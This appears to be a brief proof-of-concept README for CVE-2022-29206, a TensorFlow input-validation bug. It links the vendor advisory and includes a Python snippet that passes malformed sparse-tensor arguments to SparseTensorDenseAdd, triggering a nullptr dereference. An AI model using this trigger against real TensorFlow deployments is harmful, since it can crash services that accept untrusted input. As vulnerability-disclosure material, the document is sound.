# Proof of Concept for CVE-2022-29206

## POC URL
https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rc9w-5c64-9vqq

## Compilation Environment
- Python 3.x
- TensorFlow versions < 2.9.0 (vulnerable versions)

## Run Command
```
python poc.py
```

## Expected Output
Impact
The implementation of tf.raw_ops.SparseTensorDenseAdd does not fully validate the input arguments:

import tensorflow as tf

a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)
a_values = tf.constant([], shape=[0], dtype=tf.float32)
a_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)

b = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)

tf.raw_ops.SparseTensorDenseAdd(
    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)
In this case, a reference gets bound to a nullptr during kernel execution. This is UB.